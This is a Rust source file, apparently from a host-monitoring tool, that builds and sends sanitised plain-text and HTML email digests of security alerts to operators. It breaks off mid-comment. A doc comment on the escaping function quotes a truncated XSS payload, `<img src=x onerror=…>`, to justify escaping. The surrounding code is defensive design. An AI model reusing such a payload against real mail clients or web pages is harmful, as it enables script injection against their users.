//! `bowery notify` — email an operator who isn't watching.
//!
//! Every alert otherwise waits in a per-agent inbox until somebody runs
//! `bowery alerts` or opens the console. A confirmed lateral-movement
//! finding at 03:00 sits there until morning.
//!
//! This closes that gap without any backend: it drains alerts through
//! the **existing signed `Subscribe` transport**, filters them, and
//! sends one digest email through an SMTP relay the operator already
//! has (Gmail, their own server, anything). Run it from a systemd timer
//! on a box that is always on — the timer holds the CLI open on the
//! operator's behalf, which is the actual requirement.
//!
//! # Why the bridge sends, and not the agents
//!
//! Agents could POST their own alerts to a webhook. They deliberately
//! do not:
//!
//! - **A credential on every monitored host** is a credential every
//!   compromised host has. It lets an attacker flood the operator
//!   (denial of attention, and a way to bury the one alert that
//!   matters), read the secret, or watch for their own detection.
//! - **The bridge only forwards alerts that already verified.** They
//!   arrive in signed envelopes over the operator transport, so nothing
//!   reaches the mailbox without an operator key having authenticated
//!   the source.
//! - **Monitored hosts gain no new egress path.** They keep talking
//!   only to the mesh.
//!
//! # What goes in the message, and what doesn't
//!
//! Alert text is attacker-influenced — an `exe_path` is whatever
//! somebody managed to execute. Two rules follow:
//!
//! - **Nothing attacker-controlled reaches a header.** The subject is
//!   built from host names (which come from the operator's own peer
//!   manifest) and counts. This is what makes header injection
//!   structurally impossible rather than filtered-for.
//! - **Body fields are sanitised, capped, and escaped.** Control
//!   characters become spaces and lengths are bounded before anything
//!   is composed. The message goes out as `multipart/alternative`, so
//!   the HTML part has to withstand a hostile `rationale` on its own:
//!   every interpolated value passes through [`esc`], and the order is
//!   load-bearing — sanitise and cap *first*, escape *second*. The
//!   other way round, a cap can land mid-entity and leave `&amp;`
//!   truncated to a bare `&am`.
//! - **The HTML references no remote resource** — no image, stylesheet
//!   or font, and every style is inline. A remote fetch here would tell
//!   whoever serves it the moment an operator opened an alert about a
//!   compromise, which is a signal worth denying an attacker who has
//!   some influence over what the message contains.
//!
//! Detail *is* included in the body, unlike the webhook case, and the
//! distinction is deliberate: a webhook body traverses a third-party
//! service and is a plausible exfil channel, whereas this lands in the
//! operator's own mailbox — somewhere the attacker cannot read. The
//! cost of withholding it is an operator woken at 03:00 who cannot
//! triage without a laptop, and that trade is not worth making.

use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};

use anyhow::{Context, Result, bail};
use bowery_proto::Alert;
use serde::{Deserialize, Serialize};

use lettre::Message;
use lettre::message::{MultiPart, SinglePart, header};

use crate::peers::Manifest;
use crate::virustotal::Verdict;

/// SHA-256 (lowercase hex) → what `VirusTotal` said about it.
pub type VerdictMap = std::collections::HashMap<String, Verdict>;

/// Cap on a short identifier-shaped field copied into the body —
/// episode ids, hashes, paths. These have natural lengths well under
/// this, so the cap only ever bites on something hostile.
const FIELD_CAP: usize = 512;
/// Cap on alerts enumerated in one email. Beyond this the digest says
/// how many were omitted — a flood must not become a megabyte message.
const MAX_ENUMERATED: usize = 25;
/// Context values get more room than other fields: a command line is
/// the single most useful thing in an alert and is routinely long.
const CONTEXT_CAP: usize = 1024;
/// The rationale is the whole reason the email exists, and it is
/// **composed**, not fixed: provenance, set-id, lineage, discovery and
/// the repeat-fold note each append a clause to the analyzer's own
/// sentence, joined with ` | `. Chained, a real one runs past 800
/// characters.
///
/// It was capped at 160 alongside the identifier fields, which cut every
/// credential-read alert mid-sentence — the operator got as far as
/// "Legitimate for `su`, `sudo`, `login` and PAM; from anything el…" and
/// lost the half that says what to do about it.
///
/// Still bounded, because the rationale embeds strings the monitored
/// host controls (an exe path, a command line), and a compromised agent
/// must not be able to mail its operator a megabyte. Four thousand is
/// several times the longest chain the agent can compose and still a
/// hard ceiling.
const RATIONALE_CAP: usize = 4096;
/// Where wrapped body lines fold. Plain-text mail on a phone is the
/// target: long enough not to fragment sentences, short enough not to
/// wrap again in the client.
const WRAP_COLS: usize = 78;

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct NotifyConfig {
    pub email: EmailConfig,
    #[serde(default)]
    pub filter: FilterConfig,
    #[serde(default)]
    pub virustotal: VtConfig,
}

/// Optional `VirusTotal` screening, to keep known-clean binaries out of an
/// operator's inbox.
///
/// Off by default, and deliberately: a hash lookup discloses to
/// `VirusTotal` that somebody is investigating that hash, which for a
/// targeted implant is a tip-off to whoever planted it. Turning this on
/// is a judgement an operator makes about their own estate.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct VtConfig {
    #[serde(default)]
    pub enabled: bool,
    /// File containing only the API key, mode 0600.
    #[serde(default)]
    pub api_key_file: Option<PathBuf>,
    /// Drop alerts whose binary no engine flags.
    #[serde(default = "default_true")]
    pub suppress_known_clean: bool,
    /// Ceiling on lookups per run. The public API allows 4 a minute and
    /// 500 a day, so a digest full of new hashes must not try to spend
    /// the quota in one go.
    #[serde(default = "default_vt_max_lookups")]
    pub max_lookups: usize,
    #[serde(default)]
    pub cache_file: Option<PathBuf>,
}

impl Default for VtConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            api_key_file: None,
            suppress_known_clean: true,
            max_lookups: default_vt_max_lookups(),
            cache_file: None,
        }
    }
}

const fn default_vt_max_lookups() -> usize {
    20
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct EmailConfig {
    /// Recipients.
    pub to: Vec<String>,
    /// Envelope sender. With Gmail this must be the authenticated
    /// account, or the message is rewritten or rejected.
    pub from: String,
    pub smtp_host: String,
    #[serde(default = "default_smtp_port")]
    pub smtp_port: u16,
    pub username: String,
    /// Path to a file containing only the password, mode 0600.
    ///
    /// A separate file, not an inline string, because this config is
    /// the sort of thing that ends up in a dotfiles repo.
    pub password_file: PathBuf,
    /// STARTTLS on 587 (the default) versus implicit TLS on 465.
    #[serde(default = "default_true")]
    pub starttls: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct FilterConfig {
    /// Minimum suspicion to notify about.
    #[serde(default = "default_min_suspicion")]
    pub min_suspicion: f32,
    /// Only alerts a peer quorum confirmed.
    ///
    /// Off by default: confirmation requires mature peers, and a fleet
    /// that cannot yet confirm would silently notify about nothing.
    #[serde(default)]
    pub confirmed_only: bool,
}

impl Default for FilterConfig {
    fn default() -> Self {
        Self {
            min_suspicion: default_min_suspicion(),
            confirmed_only: false,
        }
    }
}

const fn default_smtp_port() -> u16 {
    587
}
const fn default_true() -> bool {
    true
}
const fn default_min_suspicion() -> f32 {
    0.9
}

impl NotifyConfig {
    pub fn load(path: &Path) -> Result<Self> {
        let raw = fs::read_to_string(path)
            .with_context(|| format!("reading notify config at {}", path.display()))?;
        let cfg: Self = toml::from_str(&raw)
            .with_context(|| format!("parsing notify config at {}", path.display()))?;
        if cfg.email.to.is_empty() {
            bail!("notify config has no recipients ([email] to = [...])");
        }
        Ok(cfg)
    }

    /// Read the SMTP password.
    ///
    /// Refuses a file any other user can read. The same reasoning as the
    /// eBPF loader's ownership check: a secret readable by every account
    /// on the box is not a secret, and failing loudly at setup beats
    /// discovering it after a credential is abused.
    pub fn password(&self) -> Result<String> {
        let path = expand_tilde(&self.email.password_file);
        let meta = fs::metadata(&path)
            .with_context(|| format!("reading SMTP password file {}", path.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            let mode = meta.permissions().mode() & 0o077;
            if mode != 0 {
                bail!(
                    "SMTP password file {} is group/world accessible (mode {:o}); \
                     run: chmod 600 {}",
                    path.display(),
                    meta.permissions().mode() & 0o777,
                    path.display()
                );
            }
        }
        let raw = fs::read_to_string(&path)
            .with_context(|| format!("reading SMTP password file {}", path.display()))?;
        let pw = raw.trim().to_string();
        if pw.is_empty() {
            bail!("SMTP password file {} is empty", path.display());
        }
        Ok(pw)
    }
}

/// Expand a leading `~` — `PathBuf` does not, and every operator writes
/// `~/.bowery/...` in a config file (and in a `--flag` default).
#[must_use]
pub fn expand_tilde(p: &Path) -> PathBuf {
    let Ok(rest) = p.strip_prefix("~") else {
        return p.to_path_buf();
    };
    std::env::var("HOME").map_or_else(|_| p.to_path_buf(), |home| PathBuf::from(home).join(rest))
}

// ---------------------------------------------------------------------------
// Cursors
// ---------------------------------------------------------------------------

/// Per-agent delivery cursor, so a run only reports what is new.
///
/// Keyed by fingerprint rather than name so renaming a host in the
/// manifest cannot silently replay its whole inbox.
#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct Cursors {
    #[serde(default)]
    pub by_fp: BTreeMap<String, u64>,
}

impl Cursors {
    pub fn load(path: &Path) -> Result<Self> {
        if !path.exists() {
            return Ok(Self::default());
        }
        let raw = fs::read_to_string(path)
            .with_context(|| format!("reading notify cursors at {}", path.display()))?;
        Ok(serde_json::from_str(&raw).unwrap_or_default())
    }

    pub fn save(&self, path: &Path) -> Result<()> {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).ok();
        }
        let raw = serde_json::to_string_pretty(self)?;
        fs::write(path, raw)
            .with_context(|| format!("writing notify cursors to {}", path.display()))?;
        Ok(())
    }

    #[must_use]
    pub fn since(&self, fp: &str) -> u64 {
        self.by_fp.get(fp).copied().unwrap_or(0)
    }
}

// ---------------------------------------------------------------------------
// Digest composition
// ---------------------------------------------------------------------------

/// One agent's contribution to a digest.
#[derive(Debug, Clone)]
pub struct HostAlerts {
    pub host: String,
    pub alerts: Vec<Alert>,
}

/// `2026-08-17 01:25:01 UTC`, or the raw value if it is not a sane time.
#[must_use]
pub fn format_ts(ms: u64) -> String {
    let secs = i64::try_from(ms / 1000).unwrap_or(0);
    time::OffsetDateTime::from_unix_timestamp(secs).map_or_else(
        |_| ms.to_string(),
        |t| {
            format!(
                "{:04}-{:02}-{:02} {:02}:{:02}:{:02} UTC",
                t.year(),
                u8::from(t.month()),
                t.day(),
                t.hour(),
                t.minute(),
                t.second()
            )
        },
    )
}

/// Strip anything that could break out of a plain-text line, and bound
/// the length.
///
/// Control characters become spaces — newlines above all, because a
/// value that can inject a line break can forge structure in the body.
#[must_use]
pub fn sanitize(s: &str, cap: usize) -> String {
    let cleaned: String = s
        .chars()
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect();
    let trimmed = cleaned.trim();
    if trimmed.chars().count() <= cap {
        return trimmed.to_string();
    }
    let kept: String = trimmed.chars().take(cap).collect();
    // Say what was lost rather than trailing off. A bare ellipsis reads
    // as "and so on"; this one means "go read the full alert", and the
    // operator cannot tell the difference without being told.
    let dropped = trimmed.chars().count() - cap;
    format!("{kept}… [{dropped} more characters; see `bowery alerts`]")
}

/// One `  label     : value` block, wrapped and hanging-indented so a
/// long value stays readable in plain-text mail.
///
/// The alternative was a single enormous line. Mail clients wrap it at
/// their own width, mid-word, with no indent — which turns the one field
/// an operator actually reads into a wall.
#[must_use]
pub fn labelled(label: &str, value: &str) -> String {
    use std::fmt::Write as _;

    const LABEL_W: usize = 10;
    let indent = " ".repeat(2 + LABEL_W + 2);
    let avail = WRAP_COLS.saturating_sub(indent.len()).max(24);
    let mut out = String::new();
    let mut line = String::new();
    let mut first = true;
    let flush = |line: &mut String, first: &mut bool, out: &mut String| {
        if line.is_empty() {
            return;
        }
        if *first {
            let _ = writeln!(out, "  {label:<LABEL_W$}: {line}");
            *first = false;
        } else {
            let _ = writeln!(out, "{indent}{line}");
        }
        line.clear();
    };
    for word in value.split_whitespace() {
        // A single word longer than the column budget (a path, a hash)
        // is emitted whole rather than broken: a split path is one an
        // investigator cannot paste anywhere.
        if !line.is_empty() && line.chars().count() + 1 + word.chars().count() > avail {
            flush(&mut line, &mut first, &mut out);
        }
        if !line.is_empty() {
            line.push(' ');
        }
        line.push_str(word);
    }
    flush(&mut line, &mut first, &mut out);
    if out.is_empty() {
        let _ = writeln!(out, "  {label:<LABEL_W$}:");
    }
    out
}

/// Subject line. Built only from host names and counts — never from
/// alert content, so header injection is impossible by construction
/// rather than by escaping.
#[must_use]
pub fn subject(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
    let total: usize = hosts.iter().map(|h| h.alerts.len()).sum();
    let confirmed: usize = hosts
        .iter()
        .flat_map(|h| &h.alerts)
        .filter(|a| a.confirmation.is_some_and(|c| c.confirmed))
        .count();
    let names: Vec<&str> = hosts
        .iter()
        .filter(|h| !h.alerts.is_empty())
        .map(|h| h.host.as_str())
        .collect();
    let where_ = match names.len() {
        0 => String::new(),
        1 => format!(" on {}", names[0]),
        2 => format!(" on {}, {}", names[0], names[1]),
        n => format!(" on {}, {} +{}", names[0], names[1], n - 2),
    };
    let flagged = hosts
        .iter()
        .flat_map(|h| &h.alerts)
        .filter(|a| {
            vt.get(&a.exe_sha256_hex.to_ascii_lowercase())
                .is_some_and(Verdict::is_malicious)
        })
        .count();
    // A VirusTotal hit is the loudest thing a digest can carry, so it
    // leads the subject rather than hiding in the body.
    let confirmed_note = if flagged > 0 {
        format!(" [{flagged} VT-FLAGGED]")
    } else if confirmed > 0 {
        format!(" [{confirmed} confirmed]")
    } else {
        String::new()
    };
    format!(
        "[bowery] {total} alert{}{}{}",
        if total == 1 { "" } else { "s" },
        where_,
        confirmed_note
    )
}

/// Plain-text digest body.
#[must_use]
pub fn body(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
    use std::fmt::Write as _;
    let mut out = String::new();
    let total: usize = hosts.iter().map(|h| h.alerts.len()).sum();
    let _ = writeln!(out, "{total} new alert(s) from the Bowery mesh.\n");

    for host in hosts.iter().filter(|h| !h.alerts.is_empty()) {
        let _ = writeln!(
            out,
            "== {} ({} alert(s)){}",
            host.host,
            host.alerts.len(),
            host.alerts
                .first()
                .and_then(|a| fingerprint_hex(&a.originator_fp))
                .map(|fp| format!("  fp={fp}"))
                .unwrap_or_default()
        );
        for a in host.alerts.iter().take(MAX_ENUMERATED) {
            let _ = writeln!(out);
            let _ = writeln!(
                out,
                "  suspicion : {:.2}{}",
                a.suspicion,
                match a.confirmation {
                    Some(c) if c.confirmed => format!(
                        "  CONFIRMED by {}/{} peers with no record of it",
                        c.peers_unseen, c.peers_asked
                    ),
                    // Said differently from "not confirmed" on purpose:
                    // no peer could compare, so nothing was checked.
                    Some(c) if c.peers_familiar > 0 && c.peers_unseen == 0 => format!(
                        "  (known program: {}/{} peers have it built differently)",
                        c.peers_familiar, c.peers_asked
                    ),
                    Some(c) if c.comparable() == 0 && c.peers_incomparable > 0 => format!(
                        "  (NOT CHECKED: {}/{} peers run a different platform)",
                        c.peers_incomparable, c.peers_asked
                    ),
                    Some(c) => format!(
                        "  (not confirmed: {}/{} unseen, {} refused, {} incomparable)",
                        c.peers_unseen, c.peers_asked, c.peers_refused, c.peers_incomparable
                    ),
                    None => String::new(),
                }
            );
            let _ = writeln!(out, "  when      : {}", format_ts(a.ts_unix_ms));
            let _ = writeln!(out, "  episode   : {}", sanitize(&a.episode_id, FIELD_CAP));
            // The rule is what a silence is written against; the episode
            // is only the handle used to look it up. Leaving it out meant
            // an operator could not tell what a silence would cover
            // without first going back to the agent to ask.
            if !a.rule_id.is_empty() {
                let _ = writeln!(out, "  rule      : {}", sanitize(&a.rule_id, FIELD_CAP));
            }
            if !a.exe_path.is_empty() {
                let _ = writeln!(out, "  exe       : {}", sanitize(&a.exe_path, FIELD_CAP));
            }
            if !a.exe_sha256_hex.is_empty() {
                let _ = writeln!(
                    out,
                    "  sha256    : {}",
                    sanitize(&a.exe_sha256_hex, FIELD_CAP)
                );
            }
            let _ = write!(
                out,
                "{}",
                labelled("why", &sanitize(&a.rationale, RATIONALE_CAP))
            );
            // Per alert, not just as a digest total: an operator triaging
            // one finding needs the verdict for *that* binary.
            if let Some(v) = vt.get(&a.exe_sha256_hex.to_ascii_lowercase()) {
                let _ = writeln!(out, "  vt        : {}", v.summary());
            }
            // Command line, ancestry, working directory, open handles —
            // the difference between "a rare binary ran" and something
            // an operator can actually judge from a phone.
            for attr in &a.context {
                let _ = write!(
                    out,
                    "{}",
                    labelled(
                        &sanitize(&attr.key, 16),
                        &sanitize(&attr.value, CONTEXT_CAP)
                    )
                );
            }
        }
        if host.alerts.len() > MAX_ENUMERATED {
            let _ = writeln!(
                out,
                "\n  … and {} more, not listed.",
                host.alerts.len() - MAX_ENUMERATED
            );
        }
        let _ = writeln!(out);
    }

    out.push_str(SILENCE_HELP_TEXT);
    out.push_str(
        "\n--\nFields above come from the monitored host and are\n\
         attacker-influenceable; treat them as leads, not facts.\n\
         Verify against the signed source:\n\
         \n  bowery alerts tail --agent-addr <addr> --agent-fp <fp> …\n\
         \nSent by `bowery notify`. Nothing was stored off-host.\n",
    );
    out
}

// ---------------------------------------------------------------------------
// HTML rendering
//
// The plain-text part above stays the fallback and is what `--dry-run`
// prints. This is what a real mail client shows.
// ---------------------------------------------------------------------------

/// Escape a value for interpolation into the HTML body.
///
/// The text part can lean on [`sanitize`] alone, because plain text has
/// no structure to forge once the line breaks are gone. HTML does, and
/// every field interpolated below is attacker-influenced — an
/// `exe_path` is whatever somebody managed to execute, so a file named
/// `<img src=x onerror=…>` would otherwise reach the operator's mail
/// client as markup rather than as the finding it is evidence of.
///
/// Escapes all five XML entities rather than the three that suffice for
/// element text: these values also land in attribute position, where a
/// bare quote ends the attribute and starts a new one.
#[must_use]
pub fn esc(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 16);
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            _ => out.push(c),
        }
    }
    out
}

/// Sanitise, cap, then escape — in that order, which is load-bearing.
///
/// Escaping first would let the cap land inside an entity and truncate
/// `&amp;` to `&am`, which is both wrong on the page and a way to slip
/// a stray `&` past a reader.
fn field(s: &str, cap: usize) -> String {
    esc(&sanitize(s, cap))
}

/// Full hex fingerprint of an agent, or `None` if it is not 32 bytes.
///
/// This is what `--agent-fp` wants, which is what makes the silence
/// command in the message runnable rather than a shape to fill in.
#[must_use]
pub fn fingerprint_hex(fp: &[u8]) -> Option<String> {
    let arr: [u8; 32] = fp.try_into().ok()?;
    Some(bowery_crypto::Fingerprint::from_bytes(arr).to_hex())
}

/// Left rule colour of an alert card. Suspicion is the one number an
/// operator scans for, so it gets encoded twice — as text and as the
/// only colour on the card.
fn severity_color(suspicion: f32) -> &'static str {
    if suspicion >= 0.8 {
        "#b3261e"
    } else if suspicion >= 0.5 {
        "#b26a00"
    } else {
        "#5f6368"
    }
}

const MONO: &str = "font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace";
const SANS: &str =
    "font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif";

/// Shown once per digest rather than once per alert: the command shape
/// is identical every time and only the episode id changes.
const SILENCE_HELP_TEXT: &str = concat!(
    "\nTo silence one of these across the mesh, take its episode id above:\n\n",
    "  bowery alerts silence <episode> \\\n",
    "      --reason \"<why this is benign>\" --fanout \\\n",
    "      --agent-addr <addr> --agent-fp <fp> --agent-pubkey-b64 <key> \\\n",
    "      --operator-key <path> --cluster-id <cluster>\n\n",
    "The episode id is only the handle. What gets signed is the rule, the\n",
    "binary's hash and the path that alert stands for — the episode itself\n",
    "never recurs. Add --weight 0.5 to damp rather than silence, and\n",
    "`bowery alerts unsilence <id>` undoes it.\n",
);

/// One `label / value` row inside an alert card.
fn row(out: &mut String, label: &str, value: &str, mono: bool) {
    use std::fmt::Write as _;
    let style = if mono {
        format!("{MONO};font-size:13px;word-break:break-all")
    } else {
        "font-size:13px".to_string()
    };
    let _ = write!(
        out,
        "<tr><td style=\"color:#5f6368;font-size:12px;padding:2px 10px 2px 0;\
         vertical-align:top;white-space:nowrap\">{label}</td>\
         <td style=\"{style};padding:2px 0;vertical-align:top\">{value}</td></tr>"
    );
}

/// Suspicion, the rule that produced it, and when.
///
/// A table rather than a `float`, which is among the first properties a
/// mail client drops.
fn card_header(a: &Alert) -> String {
    format!(
        "<table style=\"border-collapse:collapse;width:100%;margin-bottom:8px\"><tr>\
         <td style=\"padding:0;vertical-align:baseline\">\
         <span style=\"font-size:16px;font-weight:600;color:{}\">{:.2}</span>\
         <span style=\"{MONO};font-size:13px;margin-left:10px\">{}</span></td>\
         <td style=\"padding:0;text-align:right;color:#5f6368;font-size:12px;\
         white-space:nowrap;vertical-align:baseline\">{}</td></tr></table>",
        severity_color(a.suspicion),
        a.suspicion,
        field(&a.rule_id, FIELD_CAP),
        esc(&format_ts(a.ts_unix_ms))
    )
}

/// The quorum verdict, when there is one. Confirmed and not-confirmed
/// are different enough to deserve different weight on the page; empty
/// when no round ran, because a missing verdict is not a negative one.
fn confirmation_badge(a: &Alert) -> String {
    let Some(c) = a.confirmation else {
        return String::new();
    };
    let (bg, fg, text) = if c.confirmed {
        (
            "#fce8e6",
            "#b3261e",
            format!(
                "CONFIRMED — {}/{} peers have no record of this binary",
                c.peers_unseen, c.peers_asked
            ),
        )
    } else if c.peers_familiar > 0 && c.peers_unseen == 0 {
        // Green: the neighbourhood explained the finding rather than
        // failing to check it.
        (
            "#e6f4ea",
            "#137333",
            format!(
                "KNOWN PROGRAM — {}/{} peers run this same program, built differently",
                c.peers_familiar, c.peers_asked
            ),
        )
    } else if c.comparable() == 0 && c.peers_incomparable > 0 {
        // Amber, not grey. A round that could not run is a gap in
        // coverage, and rendering it the same as a clean result is how
        // the gap stays invisible.
        (
            "#fef7e0",
            "#8a6116",
            format!(
                "NOT CHECKED — {}/{} peers run a different platform, so they could not \
                 have this binary either way",
                c.peers_incomparable, c.peers_asked
            ),
        )
    } else {
        (
            "#f1f3f4",
            "#5f6368",
            format!(
                "not confirmed — {}/{} unseen, {} refused, {} incomparable",
                c.peers_unseen, c.peers_asked, c.peers_refused, c.peers_incomparable
            ),
        )
    };
    format!(
        "<div style=\"background:{bg};color:{fg};font-size:12px;font-weight:600;\
         padding:5px 8px;border-radius:4px;margin-bottom:8px\">{}</div>",
        esc(&text)
    )
}

/// The episode id and a silence command with the alert-specific parts
/// already filled in.
///
/// Its own block because hunting the id out of a wrapped wall of text
/// and retyping a 64-hex fingerprint is what made quieting a recurring
/// false positive something nobody did from a phone.
fn silence_block(a: &Alert) -> String {
    use std::fmt::Write as _;
    let ep = field(&a.episode_id, FIELD_CAP);
    let mut out = format!(
        "<div style=\"background:#f8f9fa;border-radius:4px;padding:8px 10px;margin-top:10px\">\
         <div style=\"color:#5f6368;font-size:11px;text-transform:uppercase;\
         letter-spacing:.4px;margin-bottom:3px\">episode id — the handle to silence this</div>\
         <div style=\"{MONO};font-size:13px;word-break:break-all;user-select:all\">{ep}</div>"
    );
    if let Some(fp) = fingerprint_hex(&a.originator_fp) {
        // Everything alert-specific, filled in; the rest is identical on
        // every invocation and lives in the operator's shell history.
        //
        // The reason is deliberately a placeholder a shell will *reject*
        // rather than one it would accept. Pasted unedited,
        // `<why this is benign>` is a redirect and fails; a `…` would
        // have signed a fleet-wide silence whose justification reads as
        // an ellipsis, and the CLI demands a reason precisely so whoever
        // finds it later can decide whether to revoke it.
        let _ = write!(
            out,
            "<div style=\"margin-top:8px\">\
             <div style=\"color:#5f6368;font-size:11px;margin-bottom:3px\">\
             plus your usual --operator-key / --agent-addr / --agent-pubkey-b64 \
             / --cluster-id</div>\
             <div style=\"{MONO};font-size:11px;color:#3c4043;word-break:break-all;\
             user-select:all\">bowery alerts silence {ep} --agent-fp {} \
             --reason &quot;&lt;why this is benign&gt;&quot; --fanout</div></div>",
            esc(&fp)
        );
    }
    out.push_str("</div>");
    out
}

fn alert_card(a: &Alert, vt: &VerdictMap) -> String {
    use std::fmt::Write as _;
    let mut out = String::new();

    let _ = write!(
        out,
        "<div style=\"border:1px solid #dadce0;border-left:4px solid {};\
         border-radius:6px;padding:12px 14px;margin:0 0 12px\">",
        severity_color(a.suspicion)
    );

    out.push_str(&card_header(a));

    out.push_str(&confirmation_badge(a));

    out.push_str("<table style=\"border-collapse:collapse;width:100%\">");
    if !a.exe_path.is_empty() {
        row(&mut out, "exe", &field(&a.exe_path, FIELD_CAP), true);
    }
    if !a.exe_sha256_hex.is_empty() {
        // Linkified only when it really is a hash. The escape would
        // hold either way, but a URL built from an unvalidated field is
        // the kind of thing that stops holding after a later edit.
        let sha = field(&a.exe_sha256_hex, FIELD_CAP);
        let value = if a.exe_sha256_hex.len() == 64
            && a.exe_sha256_hex.bytes().all(|b| b.is_ascii_hexdigit())
        {
            format!(
                "<a href=\"https://www.virustotal.com/gui/file/{sha}\" \
                 style=\"color:#1a73e8;text-decoration:none\">{sha}</a>"
            )
        } else {
            sha
        };
        row(&mut out, "sha256", &value, true);
    }
    if let Some(v) = vt.get(&a.exe_sha256_hex.to_ascii_lowercase()) {
        row(
            &mut out,
            "virustotal",
            &field(&v.summary(), FIELD_CAP),
            false,
        );
    }
    row(&mut out, "why", &field(&a.rationale, RATIONALE_CAP), false);
    for attr in &a.context {
        row(
            &mut out,
            &field(&attr.key, 16),
            &field(&attr.value, CONTEXT_CAP),
            true,
        );
    }
    out.push_str("</table>");

    out.push_str(&silence_block(a));
    out.push_str("</div>");
    out
}

/// The `text/html` alternative. Same content as [`body`], laid out for
/// a client that can render more than 78 columns.
#[must_use]
pub fn body_html(hosts: &[HostAlerts], vt: &VerdictMap) -> String {
    use std::fmt::Write as _;
    let mut out = String::new();
    let total: usize = hosts.iter().map(|h| h.alerts.len()).sum();

    let _ = write!(
        out,
        "<div style=\"{SANS};font-size:14px;line-height:1.5;color:#202124;max-width:860px\">\
         <p style=\"margin:0 0 16px\"><strong>{total}</strong> new alert(s) from the \
         Bowery mesh.</p>"
    );

    for host in hosts.iter().filter(|h| !h.alerts.is_empty()) {
        let _ = write!(
            out,
            "<h2 style=\"font-size:15px;margin:20px 0 10px;padding-bottom:4px;\
             border-bottom:1px solid #dadce0\">{}<span style=\"font-weight:400;\
             color:#5f6368\"> — {} alert(s)</span></h2>",
            field(&host.host, FIELD_CAP),
            host.alerts.len()
        );
        for a in host.alerts.iter().take(MAX_ENUMERATED) {
            out.push_str(&alert_card(a, vt));
        }
        if host.alerts.len() > MAX_ENUMERATED {
            let _ = write!(
                out,
                "<p style=\"color:#5f6368;margin:0 0 12px\">… and {} more, not listed.</p>",
                host.alerts.len() - MAX_ENUMERATED
            );
        }
    }

    let _ = write!(
        out,
        "<div style=\"border-top:1px solid #dadce0;margin-top:20px;padding-top:12px;\
         color:#5f6368;font-size:12px\">\
         <p style=\"margin:0 0 8px\">Fields above come from the monitored host and are \
         attacker-influenceable; treat them as leads, not facts. Verify against the \
         signed source with <code style=\"{MONO}\">bowery alerts tail</code>.</p>\
         <p style=\"margin:0 0 8px\">Silencing signs the rule, the binary's hash and the \
         path an alert stands for — not the episode, which never recurs. \
         <code style=\"{MONO}\">--weight 0.5</code> damps instead of silencing, and \
         <code style=\"{MONO}\">bowery alerts unsilence &lt;id&gt;</code> undoes it.</p>\
         <p style=\"margin:0\">Sent by <code style=\"{MONO}\">bowery notify</code>. \
         Nothing was stored off-host.</p></div></div>"
    );
    out
}

/// Both renderings of one digest, plus whatever `VirusTotal` held back.
///
/// Returned together so the two parts of a `multipart/alternative` can
/// never drift into saying different things — the whole point of the
/// alternative is that a client picks one and the operator is not told
/// which.
fn compose(hosts: &[HostAlerts], vt: &VerdictMap, held_back: Option<&str>) -> (String, String) {
    let text = format!(
        "{}{}",
        body(hosts, vt),
        held_back
            .map(|l| format!("\n{l}\nHeld-back alerts remain readable with `bowery alerts`.\n"))
            .unwrap_or_default()
    );
    let html = format!(
        "{}{}",
        body_html(hosts, vt),
        held_back
            .map(|l| format!(
                "<p style=\"{SANS};font-size:12px;color:#5f6368\">{}<br>Held-back alerts \
                 remain readable with <code style=\"{MONO}\">bowery alerts</code>.</p>",
                esc(l)
            ))
            .unwrap_or_default()
    );
    (text, html)
}

/// Collapse alerts that supersede each other, keeping the newest.
///
/// An episode legitimately produces several alerts: the pre-filter
/// raises one, the LLM refines it, a whisper quorum confirms it. Each
/// later one *replaces* its predecessor — the inbox has no update path,
/// so superseding is how a verdict changes. The console already collapses
/// them; without the same rule here, every email reports each finding two
/// or three times and an operator learns to skim.
///
/// An empty `episode_id` is never an identity: those alerts are distinct
/// events that happen to lack an id, and folding them together would
/// silently drop findings.
#[must_use]
pub fn dedup_by_episode(alerts: Vec<Alert>) -> Vec<Alert> {
    let mut newest: BTreeMap<String, Alert> = BTreeMap::new();
    let mut unkeyed: Vec<Alert> = Vec::new();
    for a in alerts {
        if a.episode_id.is_empty() {
            unkeyed.push(a);
            continue;
        }
        match newest.get(&a.episode_id) {
            Some(prev) if prev.ts_unix_ms >= a.ts_unix_ms => {}
            _ => {
                newest.insert(a.episode_id.clone(), a);
            }
        }
    }
    let mut out: Vec<Alert> = newest.into_values().chain(unkeyed).collect();
    // Most suspicious first: an operator reading on a phone sees the
    // worst thing without scrolling.
    out.sort_by(|a, b| {
        b.suspicion
            .partial_cmp(&a.suspicion)
            .unwrap_or(std::cmp::Ordering::Equal)
            .then(b.ts_unix_ms.cmp(&a.ts_unix_ms))
    });
    out
}

/// What `VirusTotal` screening did to a digest.
///
/// Reported in the email itself. A filter that silently removes alerts
/// is indistinguishable from one that is broken, and this one removes
/// alerts on the word of a third party — so the operator is told how
/// many, and that they can be read in full with `bowery alerts`.
#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
pub struct VtOutcome {
    pub looked_up: usize,
    pub suppressed: usize,
    pub flagged: usize,
    /// Hashes `VirusTotal` has never seen. Not reassuring, and counted
    /// separately so a digest cannot imply otherwise.
    pub unknown: usize,
    /// Lookups that could not be made — no key, quota spent, API down.
    /// These suppress nothing, and their count is stated so an operator
